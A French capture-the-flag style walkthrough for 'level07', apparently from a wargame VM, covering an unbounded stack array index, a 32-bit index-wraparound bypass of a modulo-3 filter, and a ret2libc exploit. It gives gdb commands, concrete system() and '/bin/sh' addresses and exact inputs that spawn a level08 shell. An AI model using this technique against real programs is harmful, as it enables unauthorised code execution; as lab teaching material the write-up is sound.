# Level 07 Walkthrough

## Vulnérabilité

Le programme `level07` est un **stockage de nombres sur la pile** avec deux failles :

1. **Débordement de buffer sans borne supérieure** : l'index n'est pas borné (`data[100]` mais on peut accéder à `data[114]`, `data[200]`, etc.).
2. **Filtres faibles** : seuls les indices `%3 == 0` et les nombres dont l'octet de poids fort est `0xb7` sont bloqués.
3. **Canary de pile débordable** : l'adresse de retour (`EIP`) peut être écrasée si on contourne le filtre modulo-3.

## Résumé de l'exploit

On écrit :
- `data[index_ret]` = adresse de `system()`
- `data[index_ret+2]` = adresse de `"/bin/sh"`

Quand `main()` se termine, elle saute vers `system("/bin/sh")` → shell.

---

## Étape 1 : Désassembler et identifier le layout de pile

Détermine où se trouve `data[0]` sur la pile et la taille du frame.

```bash
cd /home/users/level07

# Désassemble main et cherche la base de data
objdump -d ./level07 | grep -A 30 "<main>:"
```

**À repérer** :
- Instruction `and esp, 0xfffffff0` → alignement
- Instruction `sub esp, 0x1d0` → frame de **464 octets** (0x1d0)
- Instruction `lea ebx, [esp+0x24]` → `data[0]` est à `[esp+0x24]`

Cet offset `0x24` = 36 octets est crucial pour les calculs.

---

## Étape 2 : Calculer l'index exact de l'adresse de retour

### Qu'est-ce que le prologue ?

Le **prologue** d'une fonction, c'est les instructions au début qui :
- Sauvegardent l'ancienne pile (`push ebp`)
- Réservent de la place pour les variables locales (`sub esp, 0x1d0`)

Exemple :
```asm
push ebp
mov ebp, esp
and esp, 0xfffffff0
sub esp, 0x1d0    ← fin du prologue
```

On veut mettre le breakpoint **juste après** (quand toutes ces instructions sont exécutées) pour que la pile soit stable.

### Lancer gdb

```bash
gdb -q ./level07
```

Dans gdb :

```gdb
# Breakpoint à l'adresse juste après "sub esp, 0x1d0"
# (0x0804874d pour ce binaire, cherche la première instruction APRÈS le "sub esp")
b *0x0804874d
run
```

### Formule pour calculer l'index

Une fois le breakpoint atteint, tape :

$$\text{index\_ret} = \frac{(\text{ebp}+4) - (\text{esp}+0x24)}{4}$$

Où :
- `ebp+4` = adresse où se trouve l'EIP sauvegardé (pile-x86-32 standard)
- `esp+0x24` = adresse de `data[0]`
- `/4` car les indices indexent des `int` (4 octets)

```gdb
p/d (($ebp+4)-($esp+0x24))/4
```

**Résultat attendu** : `$1 = 114`

### Vérification (optionnel)

Pour vérifier que tu as bien trouvé l'adresse de retour, tu peux lire cet index :

```gdb
read
114
```

Tu dois voir une grosse adresse (commence par `0xf7...` = adresse libc).

### Alternative : trouver l'index par scan empirique (sans formule)

Si la formule GDB te semble trop complexe, tu peux trouver l'index directement dans le programme sans faire de calcul.

**Principe** : la return address est une adresse libc (`0xf7xxxxxxxx` en hexa, soit un grand nombre `> 4 000 000 000` en décimal). Mais attention — **elle n'est pas forcément la seule** dans cette zone : des registres callee-saved comme `EBX` peuvent aussi contenir des adresses libc (ex. `data[110]` = `0xF7FCEFF4` dans notre cas, mais c'était EBX, pas l'EIP).

Lance le programme et lis les indices un par un autour de 110–120 :

```text
read → 110
read → 112
read → 113
read → 114
```

Plusieurs valeurs peuvent ressembler à des adresses libc. **Le scan seul ne suffit pas** — il faut confirmer avec le test de crash ci-dessous.

**Confirmation** : pour chaque candidat, écris `1` à cet index et tape `quit`. Si le programme affiche `Segmentation fault` → c'est la return address. Si le programme quitte proprement → c'est autre chose (un registre sauvegardé, etc.).

```text
store
1
<index_suspect>

quit
```

> **Note** : l'index trouvé par cette méthode peut différer de 114 selon l'environnement d'exécution (GDB ajoute des variables d'environnement qui décalent la pile). La valeur exacte de l'index dépend de la session. Ce qui ne change pas : le bypass 32-bit (ajouter `2^30 = 1073741824` si l'index est multiple de 3).

---

## Étape 3 : Trouver `system()` et `"/bin/sh"`

Toujours dans `gdb` :

```gdb
# Affiche l'adresse de system() 
p/x (void *)system
p/u (unsigned int)(void *)system

# Cherche la chaîne "/bin/sh" dans libc
find &system, +9999999, "/bin/sh"

# Convertis l'adresse trouvée en décimal (ex. 0xf7f897ec)
p/u 0xf7f897ec
```

**Résultats attendus** :
- `system()` = `0xf7e6aed0` = `4159090384`
- `"/bin/sh"` = `0xf7f897ec` = `4160264172`

Quitte `gdb` :

```gdb
quit
```

---

## Étape 4 : Contourner le filtre modulo-3

Le filtre refuse les indices `% 3 == 0` (réservés pour le canary).

**Le problème** : `114 % 3 == 0` → l'index est refusé, on peut pas écrire là.

**La solution** : utiliser le **wrappe 32-bit** avec un index différent qui pointe au même endroit.

### Pourquoi `data[114]` et `data[1073741938]` pointent au même endroit

Quand tu accèdes à `data[index]`, l'adresse mémoire est :

```
adresse = base_de_data + (index × 4)
```

Les 4 octets, c'est la taille d'un `int`.

En 32-bit, il y a un truc : les nombres "wrappent" quand ils dépassent. Comme un compteur qui remonte à zéro.

**Exemple simple** :

- `data[114]` → `base + 114 × 4` = `base + 456` octets
- `data[1073741938]` → `base + 1073741938 × 4` = `base + 4294967752` octets

Mais `4294967752` est énorme et dépasse le max 32-bit (`4294967296`). Ça wrappe :

```
4294967752 - 4294967296 = 456
```

**Boom** : `data[1073741938]` pointe aussi à `base + 456` → **même endroit que** `data[114]` !

### Comment ça contourne le filtre

Le filtre check `index % 3` (pas la multiplication) :

- `114 % 3 = 0`  refusé
- `1073741938 % 3 = 1`  accepté

Mais comme les deux indices pointent au même endroit (wrappe 32-bit), on écrit à l'endroit interdit sans déclencher l'alerte.

**Résumé** : le filtre regarde le numéro d'index, pas où il pointe. On abuse ça.

---

## Étape 5 : Exploit final

Lance le programme **dans la même session** (pour que ASLR, si actif, donne les mêmes adresses libc) :

```bash
./level07
```

Tape les commandes dans l'ordre exact :

```text
store
4159090384
1073741938

store
4160264172
116

quit
```

**Explication** :
- **Premier `store`** : écrit `system()` à `data[1073741938]` = `data[114]` (l'EIP)
- **Second `store`** : écrit `"/bin/sh"` à `data[116]` (l'argument pour `system()`)
- **`quit`** : `main()` retourne → saute vers `system()` → lit l'argument à `data[116]` → `/bin/sh` → shell

Tu dois obtenir un shell `level08`

---

## Résumé des commandes (copier/coller)

```bash
# Sur la VM, niveau level07

# 1. Désassembler (pour info)
objdump -d ./level07 | head -100

# 2. Ouvrir gdb
gdb -q ./level07

# Dans gdb :
b *0x0804874d
run
p/d (($ebp+4)-($esp+0x24))/4
p/x (void *)system
p/u (unsigned int)(void *)system
find &system, +9999999, "/bin/sh"
p/u 0xf7f897ec
quit

# 3. Exploit
./level07
# Tape dans le prompt :
store
4159090384
1073741938

store
4160264172
116

quit